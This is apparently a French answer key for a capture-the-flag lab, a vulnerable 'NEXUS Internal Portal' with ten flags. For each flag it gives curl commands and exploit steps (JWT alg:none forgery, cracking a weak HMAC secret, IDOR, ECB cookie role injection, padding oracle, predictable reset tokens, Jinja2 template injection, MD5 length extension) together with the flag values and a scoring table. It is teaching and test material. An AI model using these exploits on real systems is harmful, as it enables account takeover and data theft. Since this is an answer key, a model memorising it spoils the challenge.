# NEXUS Internal Portal — Corrigé (Red Team / Crypto & Logique applicative)

Service web vulnérable. 10 flags à difficulté croissante, chacun exploitant une
faille cryptographique ou de logique. Le fil rouge : recon → contournement
d'authentification → escalade de rôle → accès aux données → récupération de
secrets → compromission complète.

Base URL dans les exemples : `http://<IP_TAILSCALE>:<PORT>` (remplacer par
l'hôte/port de l'instance CTFd).

> Convention de flag : `RootMeUp{...}` (identique au challenge DFIR ELK).

---

## Flag 1 — Recon : endpoint caché (facile)
**Vuln :** une route interne est référencée dans `robots.txt` et un commentaire HTML.
```
curl http://HOST/robots.txt
# Disallow: /internal/dev-notes
curl http://HOST/internal/dev-notes
```
`RootMeUp{r3c0n_h1dd3n_3ndp01nt}`

## Flag 2 — JWT `alg:none` (facile)
**Vuln :** `jwt_decode` accepte `alg:none` sans signature.
```
# Se connecter en guest pour comprendre le cookie
curl -X POST http://HOST/login -H 'Content-Type: application/json' \
     -d '{"username":"guest","password":"guest"}'
# Forger un token alg:none avec role=admin :
H=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"user":"admin","id":1,"role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
curl http://HOST/profile -H "Cookie: session_jwt=$H.$P."
```
`RootMeUp{jwt_4lg_n0n3_byp4ss}`

## Flag 3 — Secret HMAC faible (moyen)
**Vuln :** `/api/admin/console` exige une signature HS256 **valide**, mais le
secret (`spring2024`) est court et crackable (jwt_tool / hashcat -m 16500).
```
# Après crack du secret, signer un token HS256 role=admin et :
curl http://HOST/api/admin/console -H "Cookie: session_jwt=<jwt_signé>"
```
`RootMeUp{w34k_hm4c_s3cr3t_cr4ck3d}`

## Flag 4 — IDOR (moyen)
**Vuln :** `/api/users/<id>` ne vérifie pas que l'id demandé est le sien.
```
curl http://HOST/api/users/1007 -H "Cookie: session_jwt=<jwt valide>"
# note privée de j.reyes = le flag
```
`RootMeUp{1d0r_h0r1z0nt4l_4cc3ss}`

## Flag 5 — AES-ECB cut-and-paste / rôle réfléchi (moyen)
**Vuln :** cookie legacy `role=guest&user=<name>` chiffré en ECB ; `user` est
réfléchi et le parseur retient le **dernier** `role=`.
```
# name = "&role=admin" -> plaintext "role=guest&user=&role=admin"
curl "http://HOST/legacy/session?user=%26role%3Dadmin"
curl -X POST http://HOST/legacy/verify -H 'Content-Type: application/json' \
     -d '{"legacy_cookie":"<blob_renvoyé>"}'
```
`RootMeUp{ecb_cut_4nd_p4st3_r0l3}`

## Flag 6 — Padding oracle AES-CBC (difficile)
**Vuln :** `/vault/open` renvoie 200 (padding ok) ou 400 (bad padding) → oracle.
```
# Récupérer le blob :
curl http://HOST/vault
# Attaque padding-oracle classique (bloc par bloc, octet par octet) contre
# /vault/open pour recouvrer "vault_unlock_code=RootMeUp{...}".
```
`RootMeUp{p4dd1ng_0r4cl3_d3crypt}`

## Flag 7 — PRNG prévisible (difficile)
**Vuln :** le token de reset = `random.seed(server_time)` puis 16 hex. Le seed
(timestamp) est renvoyé par `/reset/request`.
```
curl -X POST http://HOST/reset/request -d '{"username":"admin"}' -H 'Content-Type: application/json'
# reconstruire le token en Python : random.seed(server_time) ; 16 x choice(hex)
curl -X POST http://HOST/reset/confirm -H 'Content-Type: application/json' \
     -d '{"username":"admin","token":"<reconstruit>"}'
```
`RootMeUp{pr3d1ct4bl3_prng_r3s3t}`

## Flag 8 — SSTI Jinja2 (difficile)
**Vuln :** `/api/render?name=` rend l'entrée comme template Jinja2.
```
curl "http://HOST/api/render?name=%7B%7B%20FLAG8%20%7D%7D"
# variante RCE-like : {{ config }} / {{ ''.__class__... }}
```
`RootMeUp{ss7i_j1nj4_s3rv3r_l34k}`

## Flag 9 — Hash length extension MD5 (difficile)
**Vuln :** `sig = MD5(secret || message)`. `/api/download` fuit un exemple signé
et la longueur du secret → forger `...&admin=1` par extension.
```
curl http://HOST/api/download            # exemple + secret_length
# hashpump (ou impl. maison) : append "&admin=1", nouveau msg_hex + sig
curl "http://HOST/api/download?msg_hex=<forgé_hex>&sig=<nouvelle_sig>"
```
`RootMeUp{h4sh_l3ngth_3xt3ns10n}`

## Flag 10 — Assemblage final (validation de la chaîne)
**Logique :** prouve que les étapes console (3), vault (6) et signing (9) sont faites.
```
# master_key = sha256("nexus:vault:signed")  (hex)
curl -X POST http://HOST/root/unlock -H 'Content-Type: application/json' \
     -d '{"master_key":"<sha256>"}'
```
`RootMeUp{n3xus_r00t_d0m41n_pwn3d}`

---

## Récapitulatif difficulté / scoring suggéré
| Flag | Thème | Difficulté | Points suggérés |
|---|---|---|---|
| 1 | Recon endpoint caché | Facile | 50 |
| 2 | JWT alg:none | Facile | 75 |
| 3 | HMAC faible (crack) | Moyen | 100 |
| 4 | IDOR | Moyen | 100 |
| 5 | AES-ECB cut&paste | Moyen | 125 |
| 6 | Padding oracle CBC | Difficile | 175 |
| 7 | PRNG prévisible | Difficile | 150 |
| 8 | SSTI Jinja2 | Difficile | 150 |
| 9 | Hash length extension | Difficile | 200 |
| 10 | Assemblage / chaîne | Difficile | 100 |

Total : 1225 points.
